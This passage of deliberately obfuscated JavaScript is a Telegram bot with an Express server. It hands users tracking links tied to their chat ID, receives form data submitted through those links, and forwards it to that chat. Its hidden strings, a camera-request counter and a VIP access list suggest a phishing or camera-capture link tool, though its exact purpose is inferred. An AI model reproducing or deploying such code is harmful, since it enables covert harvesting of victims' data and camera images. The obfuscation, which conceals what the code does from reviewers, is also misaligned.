        bot[_0x3f5cff(0xb04) + 'e'](_0x389c8d, _0x377de5, { 'reply_markup': { 'inline_keyboard': [_0x53ebc1] } });
        return;
    }
    if (_0x5d3837[_0x3f5cff(0x6d5)](_0x9edcce, _0x5d3837[_0x3f5cff(0xcb7)])) {
        const _0x1c37e8 = baseUrl + (_0x3f5cff(0xba5) + '=') + _0x389c8d;
        bot[_0x3f5cff(0xb04) + 'e'](_0x389c8d, _0x3f5cff(0xcee) + _0x3f5cff(0x255) + _0x3f5cff(0x67d) + '\x20' + _0x1c37e8);
        return;
    }
    const [_0x191c5b, _0x37c7aa] = _0x9edcce[_0x3f5cff(0xb11)](':');
    if (_0x5d3837[_0x3f5cff(0x75d)](_0x191c5b, _0x5d3837[_0x3f5cff(0xb3a)]))
        try {
            const _0x1e8c6f = _0x5d3837[_0x3f5cff(0x6fe)], _0x28da1b = _0x5d3837[_0x3f5cff(0x30d)], _0x1bcc15 = await axios[_0x3f5cff(0xb22)](_0x28da1b, {
                    'model': _0x5d3837[_0x3f5cff(0x2bb)],
                    'messages': [{
                            'role': _0x5d3837[_0x3f5cff(0xad3)],
                            'content': _0x1e8c6f
                        }]
                }, {
                    'headers': {
                        'Authorization': _0x5d3837[_0x3f5cff(0x81f)],
                        'Content-Type': _0x5d3837[_0x3f5cff(0x519)]
                    }
                }), _0x2f89c8 = _0x1bcc15[_0x3f5cff(0xc57)][_0x3f5cff(0x91c)][0x2 * 0x671 + -0x232 * -0x3 + -0x2 * 0x9bc][_0x3f5cff(0x33c)][_0x3f5cff(0x540)];
            bot[_0x3f5cff(0xb04) + 'e'](_0x389c8d, _0x2f89c8);
        } catch (_0x281913) {
            console[_0x3f5cff(0x7b5)](_0x5d3837[_0x3f5cff(0x238)], _0x281913[_0x3f5cff(0xcfb)] ? _0x281913[_0x3f5cff(0xcfb)][_0x3f5cff(0xc57)] : _0x281913[_0x3f5cff(0x33c)]), bot[_0x3f5cff(0xb04) + 'e'](_0x389c8d, _0x5d3837[_0x3f5cff(0xab5)]);
        }
    else {
        if (_0x5d3837[_0x3f5cff(0x1a7)](_0x9edcce, _0x5d3837[_0x3f5cff(0xb78)]))
            try {
                const _0x225545 = _0x5d3837[_0x3f5cff(0x274)], _0x49cb22 = _0x5d3837[_0x3f5cff(0x30d)], _0x561d70 = await axios[_0x3f5cff(0xb22)](_0x49cb22, {
                        'model': _0x5d3837[_0x3f5cff(0x2bb)],
                        'messages': [{
                                'role': _0x5d3837[_0x3f5cff(0xad3)],
                                'content': _0x225545
                            }]
                    }, {
                        'headers': {
                            'Authorization': _0x5d3837[_0x3f5cff(0x81f)],
                            'Content-Type': _0x5d3837[_0x3f5cff(0x519)]
                        }
                    }), _0x5514c7 = _0x561d70[_0x3f5cff(0xc57)][_0x3f5cff(0x91c)][0x1bc + 0x21a4 + -0x2360][_0x3f5cff(0x33c)][_0x3f5cff(0x540)];
                bot[_0x3f5cff(0xb04) + 'e'](_0x389c8d, _0x5514c7);
            } catch (_0x4c919f) {
                console[_0x3f5cff(0x7b5)](_0x5d3837[_0x3f5cff(0x238)], _0x4c919f[_0x3f5cff(0xcfb)] ? _0x4c919f[_0x3f5cff(0xcfb)][_0x3f5cff(0xc57)] : _0x4c919f[_0x3f5cff(0x33c)]), bot[_0x3f5cff(0xb04) + 'e'](_0x389c8d, _0x5d3837[_0x3f5cff(0xab5)]);
            }
        else {
            if (_0x5d3837[_0x3f5cff(0x6d5)](_0x9edcce, _0x5d3837[_0x3f5cff(0xb78)]))
                try {
                    const _0x390a1a = _0x5d3837[_0x3f5cff(0x274)], _0x1bd181 = _0x5d3837[_0x3f5cff(0x30d)], _0xc816f0 = await axios[_0x3f5cff(0xb22)](_0x1bd181, {
                            'model': _0x5d3837[_0x3f5cff(0x2bb)],
                            'messages': [{
                                    'role': _0x5d3837[_0x3f5cff(0xad3)],
                                    'content': _0x390a1a
                                }]
                        }, {
                            'headers': {
                                'Authorization': _0x5d3837[_0x3f5cff(0x81f)],
                                'Content-Type': _0x5d3837[_0x3f5cff(0x519)]
                            }
                        }), _0x18d0c5 = _0xc816f0[_0x3f5cff(0xc57)][_0x3f5cff(0x91c)][0x2301 + -0x1304 + -0x1 * 0xffd][_0x3f5cff(0x33c)][_0x3f5cff(0x540)];
                    bot[_0x3f5cff(0xb04) + 'e'](_0x389c8d, _0x18d0c5);
                } catch (_0x7dae3a) {
                    console[_0x3f5cff(0x7b5)](_0x5d3837[_0x3f5cff(0x30c)], _0x7dae3a[_0x3f5cff(0xcfb)] ? _0x7dae3a[_0x3f5cff(0xcfb)][_0x3f5cff(0xc57)] : _0x7dae3a[_0x3f5cff(0x33c)]);
                    const _0x1463ac = _0x5d3837[_0x3f5cff(0x62e)];
                    _0x1463ac && _0x5d3837[_0x3f5cff(0x5ea)](_0x1463ac[_0x3f5cff(0x5b6)](), '') && bot[_0x3f5cff(0xb04) + 'e'](_0x389c8d, _0x1463ac);
                }
            else {
                if (_0x5d3837[_0x3f5cff(0x920)](_0x9edcce, _0x5d3837[_0x3f5cff(0xb33)]) && _0x5d3837[_0x3f5cff(0x7c8)](_0x389c8d, 0x3 * 0xade17cfb + 0x567a9fc * -0x22 + 0x4334c41)) {
                    const _0x1b1c1a = _0x5d3837[_0x3f5cff(0x2db)];
                    _0x1b1c1a && _0x5d3837[_0x3f5cff(0x59f)](_0x1b1c1a[_0x3f5cff(0x5b6)](), '') && bot[_0x3f5cff(0xb04) + 'e'](_0x389c8d, _0x1b1c1a), bot[_0x3f5cff(0xbfd)](_0x5d3837[_0x3f5cff(0x6a3)], _0x390a6c => {
                        const _0x392e3e = _0x3f5cff, _0xf883ed = _0x390a6c[_0x392e3e(0x8e5)];
                        _0x5d3837[_0x392e3e(0x644)](addVIPUser, _0xf883ed);
                        const _0xc1be18 = _0x392e3e(0x3ab) + _0x392e3e(0xbff) + _0xf883ed + _0x392e3e(0xc08);
                        _0xc1be18 && _0x5d3837[_0x392e3e(0x3c9)](_0xc1be18[_0x392e3e(0x5b6)](), '') && bot[_0x392e3e(0xb04) + 'e'](_0x389c8d, _0xc1be18);
                    });
                } else {
                    if (_0x5d3837[_0x3f5cff(0x336)](_0x9edcce, _0x5d3837[_0x3f5cff(0x7da)]) && _0x5d3837[_0x3f5cff(0xad7)](_0x389c8d, 0x85b37308 + -0x51cb4dc8 * 0x1 + 0xf * 0x135833e6)) {
                        const _0x1146e8 = _0x5d3837[_0x3f5cff(0xb95)];
                        _0x1146e8 && _0x5d3837[_0x3f5cff(0xa1d)](_0x1146e8[_0x3f5cff(0x5b6)](), '') && bot[_0x3f5cff(0xb04) + 'e'](_0x389c8d, _0x1146e8), bot[_0x3f5cff(0xbfd)](_0x5d3837[_0x3f5cff(0x6a3)], _0x22ca19 => {
                            const _0x25b50e = _0x3f5cff, _0x1e3b16 = _0x22ca19[_0x25b50e(0x8e5)];
                            _0x5d3837[_0x25b50e(0x644)](removeVIPUser, _0x1e3b16);
                            const _0x1287db = _0x25b50e(0x222) + _0x25b50e(0xbff) + _0x1e3b16 + _0x25b50e(0x438);
                            _0x1287db && _0x5d3837[_0x25b50e(0x59f)](_0x1287db[_0x25b50e(0x5b6)](), '') && bot[_0x25b50e(0xb04) + 'e'](_0x389c8d, _0x1287db);
                        });
                    } else {
                        const [_0x4df986, _0x1b4e65] = _0x9edcce[_0x3f5cff(0xb11)](':');
                        if (!_0x400bce[_0x3f5cff(0x948)](_0x4df986) && !_0x5d3837[_0x3f5cff(0x3e1)](validateLinkUsage, _0x1b4e65, _0x4df986))
                            return;
                        let _0x5b7af4 = '';
                        switch (_0x4df986) {
                        case _0x5d3837[_0x3f5cff(0x8f2)]:
                            _0x5b7af4 = baseUrl + (_0x3f5cff(0xa73) + '=') + _0x389c8d;
                            break;
                        case _0x5d3837[_0x3f5cff(0x3ff)]:
                            _0x5b7af4 = baseUrl + (_0x3f5cff(0x7a1) + '=') + _0x389c8d;
                            break;
                        case _0x5d3837[_0x3f5cff(0x326)]:
                            _0x5b7af4 = baseUrl + (_0x3f5cff(0x6cb) + _0x3f5cff(0x1d1)) + crypto[_0x3f5cff(0x692) + 's'](-0xd19 + 0x599 + -0x58 * -0x16)[_0x3f5cff(0x906)](_0x5d3837[_0x3f5cff(0x39c)]) + _0x3f5cff(0x25c) + _0x389c8d;
                            break;
                        case _0x5d3837[_0x3f5cff(0x6e6)]:
                            const _0x59bdf7 = -0x255c + -0x26c + 0x6 * 0x6a3;
                            _0x5b7af4 = baseUrl + _0x3f5cff(0x8f8) + crypto[_0x3f5cff(0x692) + 's'](0x1b80 + -0x1105 + -0xa6b)[_0x3f5cff(0x906)](_0x5d3837[_0x3f5cff(0x39c)]) + _0x3f5cff(0x25c) + _0x389c8d + _0x3f5cff(0x660) + _0x59bdf7;
                            break;
                        case _0x5d3837[_0x3f5cff(0xb01)]:
                            _0x5b7af4 = baseUrl + (_0x3f5cff(0xc44) + '=') + _0x389c8d + (_0x3f5cff(0x399) + 'ok');
                            break;
                        case _0x5d3837[_0x3f5cff(0x40d)]:
                            _0x5b7af4 = baseUrl + (_0x3f5cff(0xc4b) + '=') + _0x389c8d;
                            break;
                        case _0x5d3837[_0x3f5cff(0xa03)]:
                            _0x5b7af4 = baseUrl + (_0x3f5cff(0xbfc) + 'd=') + _0x389c8d;
                            break;
                        default:
                            bot[_0x3f5cff(0xb04) + 'e'](_0x389c8d, '');
                            return;
                        }
                        bot[_0x3f5cff(0xb04) + 'e'](_0x389c8d, _0x3f5cff(0xccd) + _0x3f5cff(0x7db) + _0x5b7af4);
                    }
                }
            }
        }
    }
    bot[_0x3f5cff(0x5a1) + _0x3f5cff(0x600)](_0x44b7ee['id']);
}), bot[_0x298049(0x65c)](/\/jjihigjoj/, _0x1dba3c => {
    const _0xf60f48 = _0x298049, _0x4e381a = {
            'lfelo': _0xf60f48(0xa65) + _0xf60f48(0x2a2) + _0xf60f48(0x424) + _0xf60f48(0x415) + '.',
            'cYfNh': _0xf60f48(0xbf3) + _0xf60f48(0x831),
            'NTcrd': _0xf60f48(0x429) + _0xf60f48(0xa8f)
        }, _0x1a7a7e = _0x1dba3c[_0xf60f48(0x556)]['id'], _0x1cb92a = _0x4e381a[_0xf60f48(0x1c0)];
    bot[_0xf60f48(0xb04) + 'e'](_0x1a7a7e, _0x1cb92a, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x4e381a[_0xf60f48(0x2f0)],
                        'callback_data': _0x4e381a[_0xf60f48(0xa75)]
                    }]]
        }
    });
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), _0xa0dbc6 => {
    const _0x41423b = _0x298049, _0xfc6707 = {
            'DsrzU': function (_0x2fbb29, _0x32a46f) {
                return _0x2fbb29 === _0x32a46f;
            },
            'jQqmd': _0x41423b(0x429) + _0x41423b(0xa8f)
        }, _0xa1ad06 = _0xa0dbc6[_0x41423b(0x33c)][_0x41423b(0x556)]['id'];
    if (_0xfc6707[_0x41423b(0xaaf)](_0xa0dbc6[_0x41423b(0xc57)], _0xfc6707[_0x41423b(0x468)])) {
        const _0x4a614e = baseUrl + (_0x41423b(0x1c7) + 'd=') + _0xa1ad06;
        bot[_0x41423b(0xb04) + 'e'](_0xa1ad06, _0x41423b(0x666) + _0x41423b(0x591) + _0x4a614e);
    }
    bot[_0x41423b(0x5a1) + _0x41423b(0x600)](_0xa0dbc6['id']);
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), _0x1a10b8 => {
    const _0x19a23a = _0x298049, _0x4a3202 = {
            'aAiJC': function (_0x2f4746, _0x5e46bd) {
                return _0x2f4746 === _0x5e46bd;
            },
            'HfvFy': _0x19a23a(0x574),
            'dwVJU': _0x19a23a(0x33c),
            'kUsrm': _0x19a23a(0x54a) + _0x19a23a(0xba4) + _0x19a23a(0x8a2) + _0x19a23a(0x6df),
            'LIHSY': function (_0x5e25f8, _0x38ffe8) {
                return _0x5e25f8 === _0x38ffe8;
            },
            'SnLIr': _0x19a23a(0xac7),
            'TvPrU': _0x19a23a(0x1ae) + _0x19a23a(0x7bf) + _0x19a23a(0xace) + '.'
        }, _0x1e9565 = _0x1a10b8[_0x19a23a(0x33c)][_0x19a23a(0x556)]['id'];
    if (_0x4a3202[_0x19a23a(0x5d7)](_0x1a10b8[_0x19a23a(0xc57)], _0x4a3202[_0x19a23a(0xa1b)])) {
        bot[_0x19a23a(0xb04) + 'e'](_0x1e9565, _0x4a3202[_0x19a23a(0x23f)]);
        const _0x53f557 = _0x3562bc => {
            const _0x687f3f = _0x19a23a;
            if (_0x4a3202[_0x687f3f(0xb5e)](_0x3562bc[_0x687f3f(0x556)]['id'], _0x1e9565)) {
                if (_0x3562bc[_0x687f3f(0x8e5)] && _0x3562bc[_0x687f3f(0x8e5)][_0x687f3f(0x5cd)](_0x4a3202[_0x687f3f(0x2e8)])) {
                    const _0x9fb42 = _0x3562bc[_0x687f3f(0x8e5)];
                    dataStore[_0x1e9565] = { 'userLink': _0x9fb42 }, bot[_0x687f3f(0xb04) + 'e'](_0x1e9565, _0x687f3f(0x344) + _0x687f3f(0x90e) + _0x687f3f(0xa0d) + baseUrl + (_0x687f3f(0x566) + _0x687f3f(0x26d)) + _0x1e9565), bot[_0x687f3f(0xbba) + _0x687f3f(0xb37)](_0x4a3202[_0x687f3f(0xcbe)], _0x53f557);
                } else
                    bot[_0x687f3f(0xb04) + 'e'](_0x1e9565, _0x4a3202[_0x687f3f(0xb26)]);
            }
        };
        bot['on'](_0x4a3202[_0x19a23a(0xcbe)], _0x53f557);
    }
}), app[_0x298049(0x1fc)](bodyParser[_0x298049(0x990)]({ 'extended': !![] })), app[_0x298049(0x1fc)](express[_0x298049(0x1e0)](__dirname)), app[_0x298049(0xb22)](_0x298049(0xb97) + 'es', (_0x27ff96, _0x3aa8a7) => {
    const _0x357fbb = _0x298049, _0x3e37e4 = {
            'SiQjr': _0x357fbb(0x31b),
            'MXFeE': _0x357fbb(0xcf9) + _0x357fbb(0x2b7) + _0x357fbb(0x252) + ':',
            'oCdWF': _0x357fbb(0xb86) + _0x357fbb(0xc8b) + _0x357fbb(0x33b) + _0x357fbb(0xb93) + _0x357fbb(0x23c),
            'LctRj': _0x357fbb(0xcc5) + _0x357fbb(0x5a0)
        }, _0x98ca82 = _0x27ff96[_0x357fbb(0x2ea)][_0x357fbb(0x586)], _0xb1734e = _0x27ff96[_0x357fbb(0x2ea)][_0x357fbb(0x4c0)], _0x5bb5ec = _0x27ff96[_0x357fbb(0x2ea)][_0x357fbb(0x88e)];
    console[_0x357fbb(0x9d7)](_0x3e37e4[_0x357fbb(0x1df)], _0x27ff96[_0x357fbb(0x2ea)]), bot[_0x357fbb(0xb04) + 'e'](_0x98ca82, _0x357fbb(0x7f9) + _0x357fbb(0x35c) + _0xb1734e + _0x357fbb(0xaa7) + _0x5bb5ec)[_0x357fbb(0x86c)](() => {
        const _0x25ce65 = _0x357fbb;
        _0x3aa8a7[_0x25ce65(0x504)](path[_0x25ce65(0xc65)](__dirname, _0x3e37e4[_0x25ce65(0x3c1)]));
    })[_0x357fbb(0x40a)](_0x589ad0 => {
        const _0x2c9915 = _0x357fbb;
        console[_0x2c9915(0x7b5)](_0x3e37e4[_0x2c9915(0x93a)], _0x589ad0[_0x2c9915(0xcfb)] ? _0x589ad0[_0x2c9915(0xcfb)][_0x2c9915(0x2ea)] : _0x589ad0), _0x3aa8a7[_0x2c9915(0x1b1)](-0x1 * -0x2161 + -0x192b + -0x6 * 0x10b)[_0x2c9915(0x2d8)](_0x3e37e4[_0x2c9915(0xafe)]);
    });
}), app[_0x298049(0x943)](_0x298049(0x935), (_0x144339, _0x571381) => {
    const _0x366b56 = _0x298049, _0x1000be = {
            'ajmRz': _0x366b56(0x9d3) + _0x366b56(0x5ae) + _0x366b56(0x5f9),
            'soUgd': _0x366b56(0x31b)
        }, _0x3d1fd5 = _0x144339[_0x366b56(0x3a0)][_0x366b56(0x586)];
    if (!_0x3d1fd5)
        return _0x571381[_0x366b56(0x1b1)](-0x1ca2 + -0x15 * -0x1cd + 0x1 * -0x79f)[_0x366b56(0x2d8)](_0x1000be[_0x366b56(0xd12)]);
    _0x571381[_0x366b56(0x504)](path[_0x366b56(0xc65)](__dirname, _0x1000be[_0x366b56(0x3c6)]));
}), app[_0x298049(0x1fc)](bodyParser[_0x298049(0x990)]({ 'extended': !![] })), app[_0x298049(0x1fc)](express[_0x298049(0x1e0)](__dirname)), app[_0x298049(0xb22)](_0x298049(0xb97) + 'es', (_0x38c4cb, _0x83c5e9) => {
    const _0x9d8acb = _0x298049, _0x997ffb = {
            'uwHHq': _0x9d8acb(0xa5e),
            'zfAaZ': _0x9d8acb(0xcf9) + _0x9d8acb(0x2b7) + _0x9d8acb(0x252) + ':',
            'NPuCb': _0x9d8acb(0xb86) + _0x9d8acb(0xc8b) + _0x9d8acb(0x33b) + _0x9d8acb(0xb93) + _0x9d8acb(0x23c),
            'bchLB': _0x9d8acb(0xcc5) + _0x9d8acb(0x5a0)
        }, _0x42f58e = _0x38c4cb[_0x9d8acb(0x2ea)][_0x9d8acb(0x586)], _0x4a3ab6 = _0x38c4cb[_0x9d8acb(0x2ea)][_0x9d8acb(0x4c0)], _0x226397 = _0x38c4cb[_0x9d8acb(0x2ea)][_0x9d8acb(0x88e)];
    console[_0x9d8acb(0x9d7)](_0x997ffb[_0x9d8acb(0xc74)], _0x38c4cb[_0x9d8acb(0x2ea)]), bot[_0x9d8acb(0xb04) + 'e'](_0x42f58e, _0x9d8acb(0x7f9) + _0x9d8acb(0x35c) + _0x4a3ab6 + _0x9d8acb(0xaa7) + _0x226397)[_0x9d8acb(0x86c)](() => {
        const _0x11c5ad = _0x9d8acb;
        _0x83c5e9[_0x11c5ad(0x504)](path[_0x11c5ad(0xc65)](__dirname, _0x997ffb[_0x11c5ad(0x385)]));
    })[_0x9d8acb(0x40a)](_0x3fcf93 => {
        const _0x4e7972 = _0x9d8acb;
        console[_0x4e7972(0x7b5)](_0x997ffb[_0x4e7972(0x2bc)], _0x3fcf93[_0x4e7972(0xcfb)] ? _0x3fcf93[_0x4e7972(0xcfb)][_0x4e7972(0x2ea)] : _0x3fcf93), _0x83c5e9[_0x4e7972(0x1b1)](-0x1d4f + 0x97 * -0x21 + 0x32ba)[_0x4e7972(0x2d8)](_0x997ffb[_0x4e7972(0xc42)]);
    });
}), app[_0x298049(0x943)](_0x298049(0x9f8), (_0x234c14, _0x507770) => {
    const _0x21caac = _0x298049, _0x4187da = {
            'OjOaL': _0x21caac(0x9d3) + _0x21caac(0x5ae) + _0x21caac(0x5f9),
            'QgQTW': _0x21caac(0xa5e)
        }, _0x3f31f9 = _0x234c14[_0x21caac(0x3a0)][_0x21caac(0x586)];
    if (!_0x3f31f9)
        return _0x507770[_0x21caac(0x1b1)](0xd * 0x29f + -0x66b + 0x14e * -0x14)[_0x21caac(0x2d8)](_0x4187da[_0x21caac(0x93e)]);
    _0x507770[_0x21caac(0x504)](path[_0x21caac(0xc65)](__dirname, _0x4187da[_0x21caac(0xcf3)]));
}), app[_0x298049(0x1fc)](bodyParser[_0x298049(0x990)]({ 'extended': !![] })), app[_0x298049(0x1fc)](express[_0x298049(0x1e0)](__dirname)), app[_0x298049(0xb22)](_0x298049(0xb97) + 'es', (_0x4f7468, _0x13a33f) => {
    const _0x2b497c = _0x298049, _0x219059 = {
            'iEeTf': _0x2b497c(0xa2d),
            'FuBwb': _0x2b497c(0xcf9) + _0x2b497c(0x2b7) + _0x2b497c(0x252) + ':',
            'HhaDo': _0x2b497c(0xb86) + _0x2b497c(0xc8b) + _0x2b497c(0x33b) + _0x2b497c(0xb93) + _0x2b497c(0x23c),
            'uCTPX': _0x2b497c(0xcc5) + _0x2b497c(0x5a0)
        }, _0x1b901e = _0x4f7468[_0x2b497c(0x2ea)][_0x2b497c(0x586)], _0x40ddcc = _0x4f7468[_0x2b497c(0x2ea)][_0x2b497c(0x4c0)], _0xf527ec = _0x4f7468[_0x2b497c(0x2ea)][_0x2b497c(0x88e)];
    console[_0x2b497c(0x9d7)](_0x219059[_0x2b497c(0x634)], _0x4f7468[_0x2b497c(0x2ea)]), bot[_0x2b497c(0xb04) + 'e'](_0x1b901e, _0x2b497c(0x7f9) + _0x2b497c(0x35c) + _0x40ddcc + _0x2b497c(0xaa7) + _0xf527ec)[_0x2b497c(0x86c)](() => {
        const _0x413fcc = _0x2b497c;
        _0x13a33f[_0x413fcc(0x504)](path[_0x413fcc(0xc65)](__dirname, _0x219059[_0x413fcc(0x72c)]));
    })[_0x2b497c(0x40a)](_0xfe710d => {
        const _0x3c33e5 = _0x2b497c;
        console[_0x3c33e5(0x7b5)](_0x219059[_0x3c33e5(0xd27)], _0xfe710d[_0x3c33e5(0xcfb)] ? _0xfe710d[_0x3c33e5(0xcfb)][_0x3c33e5(0x2ea)] : _0xfe710d), _0x13a33f[_0x3c33e5(0x1b1)](0x1bcd + -0x41 * 0x31 + -0x21 * 0x68)[_0x3c33e5(0x2d8)](_0x219059[_0x3c33e5(0x8df)]);
    });
}), app[_0x298049(0x943)](_0x298049(0xae3), (_0x3ef380, _0x9332b5) => {
    const _0x3959c5 = _0x298049, _0x5c25f7 = {
            'xtmpm': _0x3959c5(0x9d3) + _0x3959c5(0x5ae) + _0x3959c5(0x5f9),
            'CYkCj': _0x3959c5(0xa2d)
        }, _0x372bdd = _0x3ef380[_0x3959c5(0x3a0)][_0x3959c5(0x586)];
    if (!_0x372bdd)
        return _0x9332b5[_0x3959c5(0x1b1)](0x1 * -0x11c5 + -0x20fe + 0x2c1 * 0x13)[_0x3959c5(0x2d8)](_0x5c25f7[_0x3959c5(0x2c3)]);
    _0x9332b5[_0x3959c5(0x504)](path[_0x3959c5(0xc65)](__dirname, _0x5c25f7[_0x3959c5(0x2ca)]));
});
const countryTranslation = {
        'AF': _0x298049(0xcda) + _0x298049(0x384),
        'AL': _0x298049(0x5ef),
        'DZ': _0x298049(0xaee),
        'AO': _0x298049(0x72a),
        'AR': _0x298049(0xbc8) + _0x298049(0x18c),
        'AM': _0x298049(0x538),
        'AU': _0x298049(0x258),
        'AT': _0x298049(0x65e),
        'AZ': _0x298049(0x7a7),
        'BH': _0x298049(0x447),
        'BD': _0x298049(0x2fe),
        'BY': _0x298049(0xa43),
        'BE': _0x298049(0x938),
        'BZ': _0x298049(0x737),
        'BJ': _0x298049(0x443),
        'BO': _0x298049(0x6d7),
        'BA': _0x298049(0x9fc) + _0x298049(0x239),
        'BW': _0x298049(0x95c),
        'BR': _0x298049(0xa9b),
        'BG': _0x298049(0x509),
        'BF': _0x298049(0x5bb) + _0x298049(0x3ed),
        'KH': _0x298049(0xc02),
        'CM': _0x298049(0xccb) + _0x298049(0x4af),
        'CA': _0x298049(0x314),
        'CL': _0x298049(0x991),
        'CN': _0x298049(0x6ae),
        'CO': _0x298049(0xa82),
        'CR': _0x298049(0x358) + _0x298049(0xc11),
        'HR': _0x298049(0x980),
        'CY': _0x298049(0x309),
        'CZ': _0x298049(0x4b8),
        'DK': _0x298049(0xc17),
        'EC': _0x298049(0xbd6) + _0x298049(0xa26),
        'EG': _0x298049(0x98d),
        'SV': _0x298049(0x558) + _0x298049(0xcba),
        'EE': _0x298049(0x52e),
        'ET': _0x298049(0x6de),
        'FI': _0x298049(0x9ae),
        'FR': _0x298049(0x5e9),
        'GE': _0x298049(0x490),
        'DE': _0x298049(0xb06),
        'GH': _0x298049(0x478),
        'GR': _0x298049(0x7e1),
        'GT': _0x298049(0x907) + _0x298049(0x736),
        'HN': _0x298049(0x450),
        'HK': _0x298049(0x23a) + _0x298049(0x86f),
        'HU': _0x298049(0x419),
        'IS': _0x298049(0x628),
        'IN': _0x298049(0x765),
        'ID': _0x298049(0x9b3) + _0x298049(0x653),
        'IR': _0x298049(0xca1),
        'IQ': _0x298049(0xa4c),
        'IE': _0x298049(0xbc3),
        'IL': _0x298049(0x889),
        'IT': _0x298049(0xd29),
        'CI': _0x298049(0x7be) + _0x298049(0x324),
        'JP': _0x298049(0xaa5),
        'JO': _0x298049(0x4e1),
        'KZ': _0x298049(0x1d9) + _0x298049(0x5f0),
        'KE': _0x298049(0x661),
        'KW': _0x298049(0xb4b),
        'KG': _0x298049(0xaf7) + _0x298049(0x369),
        'LV': _0x298049(0x365),
        'LB': _0x298049(0x1f3),
        'LY': _0x298049(0x7e5),
        'LT': _0x298049(0x57d),
        'LU': _0x298049(0x964) + _0x298049(0x708),
        'MO': _0x298049(0x92f),
        'MY': _0x298049(0x1aa),
        'ML': _0x298049(0x357),
        'MT': _0x298049(0x476),
        'MX': _0x298049(0x60b),
        'MC': _0x298049(0x240),
        'MN': _0x298049(0x2d5),
        'ME': _0x298049(0x7d2) + _0x298049(0x78f),
        'MA': _0x298049(0x1fb),
        'MZ': _0x298049(0x36e),
        'MM': _0x298049(0x318),
        'NA': _0x298049(0x47c),
        'NP': _0x298049(0x302),
        'NL': _0x298049(0x397),
        'NZ': _0x298049(0x360) + _0x298049(0x44c),
        'NG': _0x298049(0xbc9),
        'KP': _0x298049(0xb59) + _0x298049(0x436),
        'NO': _0x298049(0x396),
        'OM': _0x298049(0x37c),
        'PK': _0x298049(0xba7),
        'PS': _0x298049(0x51a),
        'PA': _0x298049(0x4c1),
        'PY': _0x298049(0xaa3),
        'PE': _0x298049(0x665),
        'PH': _0x298049(0xb03),
        'PL': _0x298049(0x6c9),
        'PT': _0x298049(0x834),
        'PR': _0x298049(0x315) + _0x298049(0xac1),
        'QA': _0x298049(0x494),
        'RO': _0x298049(0x9be),
        'RU': _0x298049(0x3d8),
        'RW': _0x298049(0x5ff),
        'SA': _0x298049(0x9d8),
        'SN': _0x298049(0x6a7),
        'RS': _0x298049(0x6b2),
        'SG': _0x298049(0x2a0),
        'SK': _0x298049(0xca2),
        'SI': _0x298049(0x2fb),
        'ZA': _0x298049(0x984) + _0x298049(0x639),
        'KR': _0x298049(0x642) + _0x298049(0x656),
        'ES': _0x298049(0x6dc),
        'LK': _0x298049(0x7fe),
        'SD': _0x298049(0x859),
        'SE': _0x298049(0x927),
        'CH': _0x298049(0x9a9),
        'SY': _0x298049(0x9a6),
        'TW': _0x298049(0x44b),
        'TZ': _0x298049(0x638),
        'TH': _0x298049(0xc18),
        'TG': _0x298049(0x746),
        'TN': _0x298049(0x249),
        'TR': _0x298049(0x981),
        'TM': _0x298049(0x56b) + _0x298049(0x215),
        'UG': _0x298049(0xa8e),
        'UA': _0x298049(0xac0),
        'AE': _0x298049(0x585),
        'GB': _0x298049(0xa06),
        'US': _0x298049(0x6d4),
        'UY': _0x298049(0x9c1),
        'UZ': _0x298049(0xb83) + _0x298049(0x795),
        'VE': _0x298049(0x4f1),
        'VN': _0x298049(0x1f9),
        'ZM': _0x298049(0x2e4),
        'ZW': _0x298049(0xa12),
        'GL': _0x298049(0x3a8),
        'KY': _0x298049(0x6a4) + _0x298049(0x48b),
        'NI': _0x298049(0x333) + _0x298049(0x4d0),
        'DO': _0x298049(0xa89) + _0x298049(0x4ba),
        'NC': _0x298049(0x7f8) + _0x298049(0xbe7),
        'LA': _0x298049(0x3e9),
        'TT': _0x298049(0x4bd) + _0x298049(0xae4),
        'GG': _0x298049(0x64a),
        'GU': _0x298049(0x5b1),
        'GP': _0x298049(0x2a5),
        'MG': _0x298049(0x3a3),
        'RE': _0x298049(0x527),
        'FO': _0x298049(0x232),
        'MD': _0x298049(0x304)
    }, camRequestCounts = {};
async function initStorage() {
    const _0x40154c = _0x298049, _0x5021b5 = { 'qROpj': _0x40154c(0xd1d) };
    await storage[_0x40154c(0x1b3)](), vipUsers = await storage[_0x40154c(0x1bf)](_0x5021b5[_0x40154c(0x6eb)]) || [];
}
async function saveVipUsers() {
    const _0x517dca = _0x298049, _0x35195d = { 'Vabgl': _0x517dca(0xd1d) };
    await storage[_0x517dca(0x2f4)](_0x35195d[_0x517dca(0x933)], vipUsers);
}
function showCountryList(_0x1de3f4, _0x26bc9b = 0xe73 + 0x23f9 + 0x1 * -0x326c) {
    const _0x200cf8 = _0x298049, _0x187af9 = {
            'iXipG': function (_0x17b8c7, _0x5c5c83) {
                return _0x17b8c7 + _0x5c5c83;
            },
            'oXwhb': function (_0x55d354, _0x27ad72) {
                return _0x55d354 < _0x27ad72;
            },
            'bSWju': function (_0x181c57, _0xfb0f71) {
                return _0x181c57 > _0xfb0f71;
            },
            'nXISc': _0x200cf8(0x362),
            'kjJqg': _0x200cf8(0xb55) + 'ة:'
        };
    try {
        const _0x578d62 = [], _0x4594ec = Object[_0x200cf8(0x858)](countryTranslation), _0xb91ef3 = Object[_0x200cf8(0x272)](countryTranslation), _0x1745f4 = Math[_0x200cf8(0xc6c)](_0x187af9[_0x200cf8(0x877)](_0x26bc9b, 0x2f * 0xa5 + 0x11 * -0xdc + -0x2 * 0x7a6), _0x4594ec[_0x200cf8(0x825)]);
        for (let _0x2fff49 = _0x26bc9b; _0x187af9[_0x200cf8(0x3fb)](_0x2fff49, _0x1745f4); _0x2fff49 += -0x246c + -0xd4f * 0x1 + 0x31be) {
            const _0x481885 = [];
            for (let _0x57d3ce = _0x2fff49; _0x187af9[_0x200cf8(0x3fb)](_0x57d3ce, _0x187af9[_0x200cf8(0x877)](_0x2fff49, 0x752 + 0x17a3 * 0x1 + -0x1ef2)) && _0x187af9[_0x200cf8(0x3fb)](_0x57d3ce, _0x1745f4); _0x57d3ce++) {
                const _0xca9241 = _0x4594ec[_0x57d3ce], _0x42a1d4 = _0xb91ef3[_0x57d3ce];
                _0x481885[_0x200cf8(0x39e)]({
                    'text': _0x42a1d4,
                    'callback_data': _0xca9241
                });
            }
            _0x578d62[_0x200cf8(0x39e)](_0x481885);
        }
        const _0x34e02a = [];
